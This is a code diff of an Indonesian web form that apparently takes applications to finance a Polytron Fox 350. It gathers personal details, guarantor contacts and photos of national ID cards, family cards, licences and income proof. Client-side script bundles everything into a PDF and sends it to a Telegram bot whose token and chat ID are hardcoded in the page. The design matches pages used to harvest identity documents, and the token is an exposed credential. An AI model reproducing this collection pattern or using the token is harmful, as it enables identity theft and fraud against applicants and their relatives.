@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -10,7 +9,7 @@
 
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
-/* STYLE SAMA SEPERTI SEBELUMNYA */
+/* STYLE CLEAN POLYTRON (MERAH) */
 :root { --primary: #d90429; --bg: #f8fafc; --card: #ffffff; --text: #0f172a; --border: #e2e8f0; }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); margin: 0; padding: 20px; color: var(--text); }
 .container { max-width: 550px; margin: 0 auto; background: var(--card); padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-top: 6px solid var(--primary); }
@@ -22,7 +21,6 @@ body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); marg
 label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #334155; }
 input, select { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 10px; font-size: 14px; box-sizing: border-box; font-family: inherit; transition: 0.2s; background: #f8fafc; }
 input:focus { outline: none; border-color: var(--primary); background: #fff; }
-.input-locked { background-color: #f1f5f9; color: #475569; font-weight: bold; cursor: not-allowed; border-color: #cbd5e1; }
 .upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
 .upload-box { border: 1px dashed #cbd5e1; background: #fff; border-radius: 10px; padding: 20px 10px; text-align: center; position: relative; transition: 0.2s; }
 .upload-box:hover { border-color: var(--primary); background: #fff5f5; }
@@ -48,27 +46,25 @@ input:focus { outline: none; border-color: var(--primary); background: #fff; }
     </div>
 
     <form id="formPolytron">
-        <div class="form-group"><label>Kode Referral</label><input type="text" id="referral" value="APRI" readonly class="input-locked"></div>
-
         <div class="section-label">DATA PRIBADI</div>
         <div class="form-group"><label>Nama Lengkap (Sesuai KTP)</label><input type="text" id="nama" required placeholder="Nama Lengkap"></div>
         <div class="form-group"><label>Nomor WhatsApp</label><input type="tel" id="wa" required placeholder="08xxxxxxxxxx"></div>
         <div class="form-group"><label>Alamat Email</label><input type="email" id="email" required placeholder="email@contoh.com"></div>
 
-        <div class="section-label">KONTAK DARURAT</div>
-        <div class="form-group"><label>Nama Kontak Darurat</label><input type="text" id="daruratNama" required></div>
-        <div class="form-group"><label>Nomor Kontak Darurat</label><input type="tel" id="daruratNo" required></div>
+        <div class="section-label">DATA PENJAMIN (WAJIB SATU KK)</div>
+        <div class="form-group"><label>Nama Penjamin</label><input type="text" id="penjaminNama" required></div>
+        <div class="form-group"><label>Nomor WhatsApp Penjamin</label><input type="tel" id="penjaminNo" required></div>
         <div class="form-group"><label>Hubungan</label>
-            <select id="daruratHubungan" required>
+            <select id="penjaminHubungan" required>
                 <option value="">-- Pilih Hubungan --</option>
                 <option>Orang Tua</option>
                 <option>Suami / Istri</option>
                 <option>Saudara Kandung</option>
-                <option>Kerabat Lain</option>
+                <option>Anak</option>
             </select>
         </div>
 
-        <div class="section-label">DOKUMEN</div>
+        <div class="section-label">DOKUMEN PERSYARATAN</div>
         <div class="upload-grid">
             <div class="upload-box">
                 <span class="icon">🪪</span><span class="lbl-up">KTP ASLI</span>
@@ -84,7 +80,7 @@ input:focus { outline: none; border-color: var(--primary); background: #fff; }
             </div>
             <div class="upload-box" style="border-color:#d90429; background:#fff1f2">
                 <span class="icon">👥</span><span class="lbl-up" style="color:#d90429">KTP PENJAMIN</span><span class="note-up">(WAJIB 1 KK)</span>
-                <input type="file" id="penjamin" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_penjamin">
+                <input type="file" id="foto_penjamin" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_foto_penjamin">
             </div>
             <div class="upload-box">
                 <span class="icon">⚡</span><span class="lbl-up">DOMISILI / LISTRIK</span>
@@ -112,13 +108,16 @@ input:focus { outline: none; border-color: var(--primary); background: #fff; }
 <script>
 // CONFIG TELEGRAM
 const BOT_TOKEN = "8235411301:AAE9bUwgg4eYS1M_e5_F30SAmNPgPs5zlF0";
-const CHAT_ID = "1902240448";
+// Ganti ID ini dengan ID GRUP jika mau masuk ke grup
+const CHAT_ID = "1902240448"; 
 const UNIT_NAME = "POLYTRON FOX 350";
 
 function prev(input) {
     if(input.files && input.files[0]) {
-        document.getElementById('show_' + input.id).src = URL.createObjectURL(input.files[0]);
-        document.getElementById('show_' + input.id).style.display = "block";
+        let id = input.id;
+        let imgId = id === 'foto_penjamin' ? 'show_foto_penjamin' : 'show_' + id;
+        document.getElementById(imgId).src = URL.createObjectURL(input.files[0]);
+        document.getElementById(imgId).style.display = "block";
     }
 }
 
@@ -131,14 +130,13 @@ document.getElementById('gajiInput').addEventListener('change', function(e) {
     });
 });
 
-// FUNGSI KONVERSI GAMBAR KE BASE64
 const toBase64 = file => new Promise((resolve) => {
     const reader = new FileReader();
     reader.readAsDataURL(file);
     reader.onload = () => resolve(reader.result);
 });
 
-// SUBMIT -> GENERATE PDF -> KIRIM
+// SUBMIT -> PDF -> TELEGRAM
 document.getElementById('formPolytron').addEventListener('submit', async (e) => {
     e.preventDefault();
     if(gajiFiles.length === 0) { alert("Wajib upload bukti pendapatan."); return; }
@@ -153,27 +151,27 @@ document.getElementById('formPolytron').addEventListener('submit', async (e) => 
         const { jsPDF } = window.jspdf;
         const doc = new jsPDF();
 
-        // HALAMAN 1: BIODATA
+        // 1. HALAMAN BIODATA
         load.innerText = "Membuat Halaman Biodata...";
         doc.setFontSize(18); doc.text(`PENGAJUAN: ${UNIT_NAME}`, 20, 20);
         doc.setFontSize(12);
-        doc.text(`Referral: ${document.getElementById('referral').value}`, 20, 35);
-        doc.text(`Nama: ${namaUser}`, 20, 45);
-        doc.text(`WhatsApp: ${document.getElementById('wa').value}`, 20, 55);
-        doc.text(`Email: ${document.getElementById('email').value}`, 20, 65);
-        doc.text(`---------------------------------------`, 20, 75);
-        doc.text(`Kontak Darurat:`, 20, 85);
-        doc.text(`Nama: ${document.getElementById('daruratNama').value}`, 20, 95);
-        doc.text(`No: ${document.getElementById('daruratNo').value}`, 20, 105);
-        doc.text(`Hubungan: ${document.getElementById('daruratHubungan').value}`, 20, 115);
+        // Referral Dihapus
+        doc.text(`Nama: ${namaUser}`, 20, 35);
+        doc.text(`WhatsApp: ${document.getElementById('wa').value}`, 20, 45);
+        doc.text(`Email: ${document.getElementById('email').value}`, 20, 55);
         
-        // FUNGSI TAMBAH GAMBAR KE PDF
+        doc.text(`---------------------------------------`, 20, 70);
+        doc.text(`DATA PENJAMIN (SATU KK):`, 20, 80);
+        doc.text(`Nama: ${document.getElementById('penjaminNama').value}`, 20, 90);
+        doc.text(`No WA: ${document.getElementById('penjaminNo').value}`, 20, 100);
+        doc.text(`Hubungan: ${document.getElementById('penjaminHubungan').value}`, 20, 110);
+        
+        // FUNGSI PDF GAMBAR
         async function addImageToPdf(file, title) {
             if(file) {
                 doc.addPage();
                 doc.setFontSize(14); doc.text(title, 20, 20);
                 const imgData = await toBase64(file);
-                // Hitung Rasio agar pas di kertas A4
                 const imgProps = doc.getImageProperties(imgData);
                 const pdfWidth = doc.internal.pageSize.getWidth() - 40;
                 const pdfHeight = (imgProps.height * pdfWidth) / imgProps.width;
@@ -181,16 +179,16 @@ document.getElementById('formPolytron').addEventListener('submit', async (e) => 
             }
         }
 
-        // HALAMAN FOTO DOKUMEN
-        load.innerText = "Menyematkan KTP & Dokumen...";
+        // 2. FOTO DOKUMEN
+        load.innerText = "Menyematkan Dokumen...";
         await addImageToPdf(document.getElementById('ktp').files[0], "KTP ASLI");
         await addImageToPdf(document.getElementById('kk').files[0], "KARTU KELUARGA");
         await addImageToPdf(document.getElementById('sim').files[0], "SIM C");
-        await addImageToPdf(document.getElementById('penjamin').files[0], "KTP PENJAMIN");
+        await addImageToPdf(document.getElementById('foto_penjamin').files[0], "KTP PENJAMIN"); // Foto Penjamin
         await addImageToPdf(document.getElementById('domisili').files[0], "DOMISILI / LISTRIK");
         await addImageToPdf(document.getElementById('profil').files[0], "PROFIL OJOL");
 
-        // HALAMAN GAJI
+        // 3. BUKTI PENDAPATAN
         load.innerText = "Menyematkan Bukti Gaji...";
         let count = 1;
         for (let file of gajiFiles) {
@@ -198,22 +196,21 @@ document.getElementById('formPolytron').addEventListener('submit', async (e) => 
             count++;
         }
 
-        // GENERATE BLOB
         const pdfBlob = doc.output('blob');
 
-        // KIRIM KE TELEGRAM SEBAGAI DOKUMEN
-        load.innerText = "Mengirim File PDF ke Telegram...";
+        // 4. KIRIM PDF KE TELEGRAM
+        load.innerText = "Mengirim PDF ke Admin...";
         let formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('document', pdfBlob, `PENGAJUAN_${namaUser.replace(/\s+/g, '_')}.pdf`);
-        formData.append('caption', `📄 File Pengajuan: ${namaUser}\nUnit: ${UNIT_NAME}`);
+        formData.append('document', pdfBlob, `POLYTRON_${namaUser.replace(/\s+/g, '_')}.pdf`);
+        formData.append('caption', `📄 Pengajuan Polytron: ${namaUser}\n(Data Penjamin ada di dalam PDF)`);
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
             method: 'POST',
             body: formData
         });
 
-        alert("✅ SUKSES! Data terkirim dalam 1 File PDF.");
+        alert("✅ SUKSES! File PDF terkirim.");
         window.location.href = "index.html";
 
     } catch(err) {
